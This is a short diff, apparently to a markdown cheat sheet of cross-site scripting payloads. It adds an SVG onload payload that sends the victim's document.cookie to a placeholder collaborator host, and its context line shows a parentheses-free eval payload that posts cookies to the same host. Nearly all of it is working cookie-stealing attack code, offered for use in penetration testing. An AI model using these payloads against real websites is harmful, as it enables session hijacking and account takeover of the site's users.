@@ -18,6 +18,9 @@
 
 // No parentheses
 "-eval.call`${"fetch\x28'<your-collaborator>', {method: 'POST', mode: 'no-cors', body: document.cookie}\x29"}`-"
+
+// SVG to steal cookie
+'"><svg/onload=fetch(`//<your-collaborator>/cookie?=${encodeURIComponent(document.cookie)}`)>
 ```
 
 # Code Injection
